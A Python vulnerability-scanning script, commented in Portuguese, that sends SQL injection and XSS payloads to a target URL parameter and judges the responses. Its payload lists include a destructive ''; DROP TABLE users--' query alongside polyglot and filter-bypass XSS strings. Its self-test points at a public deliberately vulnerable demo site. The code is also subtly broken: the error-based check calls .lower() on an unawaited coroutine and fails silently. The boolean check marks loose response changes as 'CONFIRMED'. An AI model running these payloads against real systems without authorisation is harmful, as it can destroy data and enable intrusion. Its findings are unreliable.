#!/usr/bin/env python3
"""
LIBERTUS VALIDATION ENGINE v1.0
Engine de payload adaptativo com validação robusta
Reduz falsos negativos através de múltiplos vetores de ataque
"""

import asyncio
import aiohttp
import re
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum


class VulnType(Enum):
    SQLI = "SQL Injection"
    XSS = "Cross-Site Scripting"
    COMMAND_INJECTION = "Command Injection"
    PATH_TRAVERSAL = "Path Traversal"


class ValidationLevel(Enum):
    DETECTED = "DETECTED"          # Padrão encontrado
    LIKELY = "LIKELY"               # Comportamento suspeito
    CONFIRMED = "CONFIRMED"         # Prova técnica
    EXPLOITED = "EXPLOITED"         # Exploração bem-sucedida


@dataclass
class PayloadResult:
    """Resultado de um teste de payload"""
    payload: str
    response_length: int
    response_time: float
    status_code: int
    evidence: List[str]
    validation_level: ValidationLevel
    
    def __repr__(self):
        return f"PayloadResult(validation={self.validation_level.value}, evidence={len(self.evidence)})"


class SQLiEngine:
    """
    Engine de detecção de SQL Injection
    Múltiplos vetores, validação progressiva
    """
    
    def __init__(self):
        # Payloads organizados por técnica
        self.payloads = {
            'boolean_based': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 'a'='a",
                "admin' OR '1'='1'--",
                "' OR '1'='1' /*",
                "1' OR '1'='1",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
                "1' UNION SELECT NULL--",
            ],
            'error_based': [
                "'",
                "''",
                "'\"",
                "1' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND 1=1--",
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "1'; SELECT 1--",
                "'; SELECT SLEEP(5)--",
            ]
        }
        
        # Patterns de erro SQL
        self.error_patterns = [
            r'sql syntax',
            r'mysql_fetch',
            r'mysql_num_rows',
            r'postgresql',
            r'ora-\d+',
            r'sqlite',
            r'db2',
            r'sqlserver',
            r'unclosed quotation',
            r'quoted string not properly terminated',
            r'unexpected end of SQL command',
            r'warning.*mysql',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'com\.mysql\.jdbc',
            r'Microsoft OLE DB Provider for SQL Server',
            r'Incorrect syntax near',
        ]
        
        # Timeout para requisições
        self.timeout = aiohttp.ClientTimeout(total=10)
    
    async def test_url(self, session: aiohttp.ClientSession, url: str, 
                       param: str = 'id') -> List[Dict]:
        """
        Testa URL para SQLi com múltiplos payloads
        Retorna lista de vulnerabilidades confirmadas
        """
        
        vulnerabilities = []
        
        # 1. BASELINE: Capturar resposta normal
        baseline = await self._get_baseline(session, url, param)
        if not baseline:
            return []
        
        baseline_len, baseline_time, baseline_status = baseline
        
        # 2. BOOLEAN-BASED SQLi
        boolean_vulns = await self._test_boolean_based(
            session, url, param, baseline_len, baseline_status
        )
        vulnerabilities.extend(boolean_vulns)
        
        # 3. ERROR-BASED SQLi
        error_vulns = await self._test_error_based(
            session, url, param
        )
        vulnerabilities.extend(error_vulns)
        
        # 4. TIME-BASED SQLi (apenas se nada encontrado ainda)
        if not vulnerabilities:
            time_vulns = await self._test_time_based(
                session, url, param, baseline_time
            )
            vulnerabilities.extend(time_vulns)
        
        return vulnerabilities
    
    async def _get_baseline(self, session: aiohttp.ClientSession, 
                           url: str, param: str) -> Optional[Tuple[int, float, int]]:
        """Captura resposta baseline"""
        
        try:
            import time
            start = time.time()
            
            async with session.get(
                f"{url}?{param}=1",
                timeout=self.timeout
            ) as resp:
                text = await resp.text()
                elapsed = time.time() - start
                
                return (len(text), elapsed, resp.status)
        
        except Exception:
            return None
    
    async def _test_boolean_based(self, session: aiohttp.ClientSession,
                                  url: str, param: str,
                                  baseline_len: int,
                                  baseline_status: int) -> List[Dict]:
        """Testa Boolean-based SQLi"""
        
        vulns = []
        
        for payload in self.payloads['boolean_based']:
            try:
                test_url = f"{url}?{param}={payload}"
                
                async with session.get(test_url, timeout=self.timeout) as resp:
                    text = await resp.text()
                    resp_len = len(text)
                    
                    # Validação 1: Mudança estrutural significativa
                    len_diff_pct = abs(resp_len - baseline_len) / baseline_len if baseline_len > 0 else 0
                    
                    # Validação 2: Status code mudou?
                    status_changed = resp.status != baseline_status
                    
                    # Validação 3: Padrões de sucesso
                    success_patterns = [
                        r'welcome',
                        r'admin',
                        r'dashboard',
                        r'logged in',
                    ]
                    
                    has_success = any(
                        re.search(pattern, text, re.IGNORECASE)
                        for pattern in success_patterns
                    )
                    
                    # CONFIRMAÇÃO: Mudança >20% OU status mudou OU padrão de sucesso
                    if len_diff_pct > 0.2 or status_changed or has_success:
                        vulns.append({
                            'type': VulnType.SQLI.value,
                            'severity': 'CRITICAL',
                            'technique': 'Boolean-based blind',
                            'url': test_url,
                            'payload': payload,
                            'evidence': f"Response diff: {len_diff_pct:.1%}, Status: {baseline_status}→{resp.status}",
                            'validation': ValidationLevel.CONFIRMED.value,
                            'baseline_length': baseline_len,
                            'response_length': resp_len
                        })
                        break  # Encontrou, não precisa testar mais
            
            except:
                continue
        
        return vulns
    
    async def _test_error_based(self, session: aiohttp.ClientSession,
                                url: str, param: str) -> List[Dict]:
        """Testa Error-based SQLi"""
        
        vulns = []
        
        for payload in self.payloads['error_based']:
            try:
                test_url = f"{url}?{param}={payload}"
                
                async with session.get(test_url, timeout=self.timeout) as resp:
                    text = await resp.text().lower()
                    
                    # Procurar por mensagens de erro SQL
                    errors_found = []
                    for pattern in self.error_patterns:
                        matches = re.findall(pattern, text, re.IGNORECASE)
                        if matches:
                            errors_found.extend(matches)
                    
                    # CONFIRMAÇÃO: Erro SQL detectado
                    if errors_found:
                        vulns.append({
                            'type': VulnType.SQLI.value,
                            'severity': 'CRITICAL',
                            'technique': 'Error-based',
                            'url': test_url,
                            'payload': payload,
                            'evidence': f"SQL errors: {', '.join(errors_found[:3])}",
                            'validation': ValidationLevel.CONFIRMED.value,
                            'error_count': len(errors_found)
                        })
                        break
            
            except:
                continue
        
        return vulns
    
    async def _test_time_based(self, session: aiohttp.ClientSession,
                               url: str, param: str,
                               baseline_time: float) -> List[Dict]:
        """Testa Time-based blind SQLi"""
        
        vulns = []
        
        # Apenas testar se baseline foi rápido (<2s)
        if baseline_time > 2.0:
            return []
        
        for payload in self.payloads['time_based'][:2]:  # Top 2 apenas
            try:
                import time
                
                test_url = f"{url}?{param}={payload}"
                
                start = time.time()
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    await resp.text()
                    elapsed = time.time() - start
                
                # CONFIRMAÇÃO: Delay de 5s detectado
                if elapsed > 4.5:  # 5s esperado, tolerância de 0.5s
                    vulns.append({
                        'type': VulnType.SQLI.value,
                        'severity': 'CRITICAL',
                        'technique': 'Time-based blind',
                        'url': test_url,
                        'payload': payload,
                        'evidence': f"Delay: {elapsed:.1f}s (expected 5s)",
                        'validation': ValidationLevel.CONFIRMED.value,
                        'response_time': elapsed
                    })
                    break
            
            except asyncio.TimeoutError:
                # Timeout pode indicar SQLi time-based
                vulns.append({
                    'type': VulnType.SQLI.value,
                    'severity': 'HIGH',
                    'technique': 'Time-based blind',
                    'url': test_url,
                    'payload': payload,
                    'evidence': 'Request timeout (possible SLEEP)',
                    'validation': ValidationLevel.LIKELY.value
                })
                break
            
            except:
                continue
        
        return vulns


class XSSEngine:
    """
    Engine de detecção de XSS
    Múltiplos vetores, validação de reflexão
    """
    
    def __init__(self):
        # Payloads organizados por contexto
        self.payloads = {
            'reflected_basic': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
            ],
            'reflected_advanced': [
                "'><script>alert(String.fromCharCode(88,83,83))</script>",
                "\"><script>alert('XSS')</script>",
                "<script>alert(document.domain)</script>",
                "javascript:alert('XSS')",
            ],
            'dom_based': [
                "#<img src=x onerror=alert('XSS')>",
                "'-alert('XSS')-'",
                "\";alert('XSS');//",
            ],
            'polyglot': [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
                "'\"--></style></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('XSS')//'>",
            ],
            'filter_bypass': [
                "<SCRiPT>alert('XSS')</SCRiPT>",
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<img src=\"x\" onerror=\"alert('XSS')\">",
                "<iframe src=javascript:alert('XSS')>",
            ]
        }
        
        # Marcadores únicos para validação
        self.markers = [
            'XSS_MARKER_9x4f2k',
            'TEST_7h3j9m',
            'VULN_5k2p8q',
        ]
        
        self.timeout = aiohttp.ClientTimeout(total=10)
    
    async def test_url(self, session: aiohttp.ClientSession, url: str,
                       param: str = 'search') -> List[Dict]:
        """Testa URL para XSS com múltiplos payloads"""
        
        vulnerabilities = []
        
        # 1. REFLECTED XSS (básico)
        reflected_vulns = await self._test_reflected(
            session, url, param
        )
        vulnerabilities.extend(reflected_vulns)
        
        # 2. FILTER BYPASS (se nada encontrado)
        if not vulnerabilities:
            bypass_vulns = await self._test_filter_bypass(
                session, url, param
            )
            vulnerabilities.extend(bypass_vulns)
        
        return vulnerabilities
    
    async def _test_reflected(self, session: aiohttp.ClientSession,
                              url: str, param: str) -> List[Dict]:
        """Testa Reflected XSS"""
        
        vulns = []
        
        for payload in self.payloads['reflected_basic']:
            try:
                test_url = f"{url}?{param}={payload}"
                
                async with session.get(test_url, timeout=self.timeout) as resp:
                    text = await resp.text()
                    
                    # Validação 1: Payload refletido EXATAMENTE
                    exact_reflection = payload in text
                    
                    # Validação 2: Payload refletido SEM encoding
                    encoded_forms = [
                        payload.replace('<', '&lt;').replace('>', '&gt;'),
                        payload.replace("'", '&#39;'),
                        payload.replace('"', '&quot;'),
                    ]
                    
                    is_encoded = any(enc in text for enc in encoded_forms)
                    
                    # Validação 3: Tag <script> presente
                    has_script_tag = '<script>' in text.lower()
                    
                    # CONFIRMAÇÃO: Refletido SEM encoding
                    if exact_reflection and not is_encoded:
                        vulns.append({
                            'type': VulnType.XSS.value,
                            'severity': 'HIGH',
                            'technique': 'Reflected XSS',
                            'url': test_url,
                            'payload': payload,
                            'evidence': 'Payload refletido sem sanitização',
                            'validation': ValidationLevel.CONFIRMED.value,
                            'reflected_exactly': True,
                            'has_script_tag': has_script_tag
                        })
                        break
            
            except:
                continue
        
        return vulns
    
    async def _test_filter_bypass(self, session: aiohttp.ClientSession,
                                  url: str, param: str) -> List[Dict]:
        """Testa bypass de filtros XSS"""
        
        vulns = []
        
        for payload in self.payloads['filter_bypass']:
            try:
                test_url = f"{url}?{param}={payload}"
                
                async with session.get(test_url, timeout=self.timeout) as resp:
                    text = await resp.text()
                    
                    # Validação: Procurar partes do payload
                    payload_parts = [
                        'alert',
                        'onerror',
                        'onload',
                        'javascript:',
                    ]
                    
                    parts_found = [part for part in payload_parts if part.lower() in text.lower()]
                    
                    # CONFIRMAÇÃO: 2+ partes encontradas
                    if len(parts_found) >= 2:
                        vulns.append({
                            'type': VulnType.XSS.value,
                            'severity': 'HIGH',
                            'technique': 'XSS Filter Bypass',
                            'url': test_url,
                            'payload': payload,
                            'evidence': f"Parts reflected: {', '.join(parts_found)}",
                            'validation': ValidationLevel.LIKELY.value,
                            'parts_count': len(parts_found)
                        })
                        break
            
            except:
                continue
        
        return vulns


# Testes
if __name__ == "__main__":
    
    async def test_engines():
        print("🔬 VALIDATION ENGINE v1.0 - TESTE")
        print("="*60)
        
        async with aiohttp.ClientSession() as session:
            
            # Teste SQLi
            print("\n1️⃣ Testando SQLi Engine...")
            sqli = SQLiEngine()
            
            # Target de teste conhecido vulnerável
            test_url = "http://testphp.vulnweb.com/artists.php"
            
            vulns = await sqli.test_url(session, test_url, 'artist')
            
            print(f"   Vulnerabilidades encontradas: {len(vulns)}")
            for v in vulns:
                print(f"   - {v['technique']}: {v['validation']}")
            
            # Teste XSS
            print("\n2️⃣ Testando XSS Engine...")
            xss = XSSEngine()
            
            vulns_xss = await xss.test_url(session, test_url, 'artist')
            
            print(f"   Vulnerabilidades encontradas: {len(vulns_xss)}")
            for v in vulns_xss:
                print(f"   - {v['technique']}: {v['validation']}")
        
        print("\n" + "="*60)
    
    asyncio.run(test_engines())
